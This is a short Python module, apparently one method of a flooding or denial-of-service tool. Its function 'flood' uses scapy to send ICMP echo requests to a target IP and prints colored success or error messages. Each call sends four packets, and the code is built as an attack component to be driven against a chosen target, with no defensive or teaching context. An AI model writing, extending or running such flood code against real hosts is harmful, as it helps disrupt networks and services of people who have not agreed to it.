# Import modules
from scapy.all import IP, ICMP, send
from colorama import Fore


def flood(target: tuple[str, int]) -> None:
    """Send ICMP echo request packets to target.
    
    Args:
        target: Tuple of (ip_address, port)
    """
    packet = IP(dst=target[0]) / ICMP(type=8, code=0)

    for _ in range(4):
        try:
            send(packet, verbose=False)
        except PermissionError:
            print(
                f"{Fore.RED}[!] {Fore.MAGENTA}Permission denied. Run as administrator/root.{Fore.RESET}"
            )
        except OSError as e:
            print(
                f"{Fore.RED}[!] {Fore.MAGENTA}Network error while sending ICMP: {e}{Fore.RESET}"
            )
        else:
            print(
                f"{Fore.GREEN}[+] {Fore.YELLOW}ICMP packet sent to {target[0]}{Fore.RESET}"
            )
